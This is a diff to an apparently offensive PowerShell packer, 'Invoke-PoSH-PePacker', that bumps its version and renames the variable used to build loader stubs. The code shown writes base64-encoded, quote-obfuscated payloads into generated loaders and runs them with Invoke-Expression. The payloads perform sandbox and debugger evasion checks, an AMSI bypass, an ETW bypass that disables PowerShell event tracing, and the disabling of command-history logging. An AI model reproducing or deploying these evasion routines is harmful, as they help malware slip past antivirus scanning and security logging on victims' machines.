@@ -21,7 +21,7 @@ Write-Output "
  | _ \ __|__| _ \__  __| |_____ _ _ 
  |  _/ _|___|  _/ _|/ _| / / -_)  _|
  |_| |___|  |_| \__,\__|_\_\___|_|  
-                                   v1.3
+                                   v1.4
 
 Usage: 
 > Import-Module ./Invoke-PoSH-PePacker.ps1
@@ -144,11 +144,11 @@ function Invoke-PoSH-PePacker {
 	if ($sandbox) {	
         Write-Output "[*] Adding basic sandbox checks"
         $code_fixed_order1 += '${17} = "cSAiV09SS0dST1VQIikge2V4aXR9IGVsc2VpZiAoVCdlJ3MndCctUEF0SCBWYXInaSdhJ2InbGU6"' + "`r`n"
-        $stub_template += $code_fixed_order1 -join ''
+        $AssemblyLoaderFileFile += $code_fixed_order1 -join ''
         $code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("aWYgKChHZXQtV01JT2JqZWN0IC1DbGFzcyBXaW4zMl9Db21wdXRlclN5c3RlbSkuRG9tYWluIC1l"+${17}+"UFMnRCdlJ2IndWdDT050ZVh0KSB7ZXhpdH0gZWxzZSB7Uyd0J2EnUlQtU2xFJ0VwIC1zIDYwfTs="))' + "`r`n"
-        $stub_template += $code_fixed_order2 -join ''
+        $AssemblyLoaderFileFile += $code_fixed_order2 -join ''
         $code_fixed_order3 += "iN'v'Oke-exPReS'S'iOn"+'(${18})' + "`r`n"
-        $stub_template += $code_fixed_order3 -join ''
+        $AssemblyLoaderFileFile += $code_fixed_order3 -join ''
         }
 
         Write-Output "[*] Adding 'A'M'S'I' bypass"
@@ -163,21 +163,21 @@ function Invoke-PoSH-PePacker {
  
         Write-Output "[*] Adding 'E'T'W' bypass" 
         $code_fixed_order8 += '${12} = "HVlKFtSZWZdLkFzU0VtYkxZLkdldFR5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
-        $stub_template += $code_fixed_order8 -join ''
+        $AssemblyLoaderFileFile += $code_fixed_order8 -join ''
         $code_fixed_order9 += '${13} = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhb"' + "`r`n"
-        $stub_template += $code_fixed_order9 -join ''
+        $AssemblyLoaderFileFile += $code_fixed_order9 -join ''
         $code_fixed_order10 += '${14} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${13}+${12})))' + "`r`n"
-        $stub_template += $code_fixed_order10 -join ''
+        $AssemblyLoaderFileFile += $code_fixed_order10 -join ''
         $code_fixed_order11 += "iN'v'Oke-exPReS'S'iOn"+'(${14})' + "`r`n"
-        $stub_template += $code_fixed_order11 -join ''
+        $AssemblyLoaderFileFile += $code_fixed_order11 -join ''
         
         Write-Output "[*] Disabling PoSh history logging"
         $code_fixed_order12 += '${15} = "LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn"' + "`r`n"
-        $stub_template += $code_fixed_order12 -join ''
+        $AssemblyLoaderFileFile += $code_fixed_order12 -join ''
         $code_fixed_order13 += '${16} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("U2V0LVBTUmVBZExJbmVPcFRpb24g"+${15})))' + "`r`n"
-        $stub_template += $code_fixed_order13 -join ''
+        $AssemblyLoaderFileFile += $code_fixed_order13 -join ''
         $code_fixed_order14 += "iN'v'Oke-exPReS'S'iOn"+'(${16})' + "`r`n"
-        $stub_template += $code_fixed_order14 -join ''
+        $AssemblyLoaderFileFile += $code_fixed_order14 -join ''
         
         $Code_alternatives  = @()
         $Code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
